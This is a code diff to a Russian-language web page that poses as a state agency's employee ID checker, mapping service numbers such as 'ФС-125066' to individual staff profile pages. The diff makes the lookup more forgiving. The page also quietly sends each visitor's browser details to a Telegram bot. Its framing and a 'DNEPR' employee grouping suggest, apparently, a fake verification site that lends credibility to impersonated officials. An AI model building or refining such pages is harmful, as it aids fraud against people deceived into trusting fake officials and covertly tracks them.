@@ -1201,7 +1201,7 @@
             <div class="verification-box">
                 <div class="section-title">Проверка сотрудника</div>
                 <p>Введите номер служебного удостоверения для мгновенной верификации личности.</p>
-                <input type="text" id="id-input" class="input-style" placeholder="Например: ФС-123456">
+                <input type="text" id="id-input" class="input-style" placeholder="Например: ФС-125066">
                 <button onclick="checkEmployee()" class="btn-verify">Проверить</button>
             </div>
         </div>
@@ -1411,7 +1411,7 @@
                 message += `🖥️ Браузер: ${navigator.userAgent.substring(0, 60)}...`;
 
                 const url = `https://api.telegram.org/bot${BOT_TOKEN_STATS}/sendMessage`;
-                const response = await fetch(url, {
+                await fetch(url, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
@@ -1420,10 +1420,6 @@
                         parse_mode: 'HTML'
                     })
                 });
-
-                const result = await response.json();
-                console.log('📊 Статистика отправлена в @StatistRosfinBot');
-                console.log('Ответ:', result);
             } catch (error) {
                 console.error('❌ Ошибка отправки статистики:', error);
             }
@@ -1450,37 +1446,46 @@
         }
 
         function checkEmployee() {
-            var val = document.getElementById('id-input').value.trim().toUpperCase();
+            var val = document.getElementById('id-input').value.trim();
             
             if (val === "") {
                 alert('Пожалуйста, введите номер служебного удостоверения.');
                 return;
             }
 
-            // ====================================================
-            // ===== DNEPR (9 сотрудников) =======================
-            // ====================================================
-            switch(val) {
-                case 'ФС-125066': window.location.href = 'Minin_M_V.html'; break;
-                case 'ФС-270038': window.location.href = 'Leonova.html'; break;
-                case 'ФС-125077': window.location.href = 'Sviridova_A_V.html'; break;
-                case 'ФС-125088': window.location.href = 'Popova_V_A.html'; break;
-                case 'ФС-127025': window.location.href = 'Rybov.html'; break;
-                case 'ФС-125044': window.location.href = 'Kuznecova_A_A.html'; break;
-                case 'ФС-016226': window.location.href = 'Samoilova_A_S.html'; break;
-                case 'ФС-270045': window.location.href = 'kadeev.html'; break;
-                case 'ФС-125022': window.location.href = 'Visotka.html'; break;
-                case 'ФС-125011': window.location.href = 'Smirnov.html'; break;
-                case 'ФС-125010': window.location.href = 'kalinin.html'; break;
+            // ВЫТАСКИВАЕМ ТОЛЬКО ЦИФРЫ
+            var digitsOnly = val.replace(/\D/g, '');
 
-                case 'ФС-310777': window.location.href = 'Naumov_D_N.html'; break;
-                case 'ФС-310773': window.location.href = 'Zolotarev_A_N.html'; break;
-                case 'ФС-310770': window.location.href = 'Zakharov_A_Y.html'; break;
-                case 'ФС-310771': window.location.href = 'zenin.html'; break;
+            if (digitsOnly === "") {
+                alert('Некорректный формат. Введите номер, например: 125066 или ФС-125066');
+                return;
+            }
 
-                default:
-                    alert("Сотрудник с удостоверением '" + val + "' не найден в базе данных Центрального аппарата ведомства.");
-                    break;
+            // КАРТА СОТРУДНИКОВ (ключ — только цифры)
+            var employeeMap = {
+                '125066': 'Minin_M_V.html',
+                '270038': 'Leonova.html',
+                '125077': 'Sviridova_A_V.html',
+                '125088': 'Popova_V_A.html',
+                '127025': 'Rybov.html',
+                '125044': 'Kuznecova_A_A.html',
+                '016226': 'Samoilova_A_S.html',
+                '270045': 'kadeev.html',
+                '125022': 'Visotka.html',
+                '125011': 'Smirnov.html',
+                '125010': 'kalinin.html',
+                '310777': 'Naumov_D_N.html',
+                '310773': 'Zolotarev_A_N.html',
+                '310770': 'Zakharov_A_Y.html',
+                '310771': 'zenin.html'
+            };
+
+            var targetPage = employeeMap[digitsOnly];
+
+            if (targetPage) {
+                window.location.href = targetPage;
+            } else {
+                alert("❌ Сотрудник с номером '" + digitsOnly + "' не найден в базе данных.\n\nПопробуйте ввести номер без лишних символов.\nПримеры: 125066 или ФС-125066");
             }
         }
 
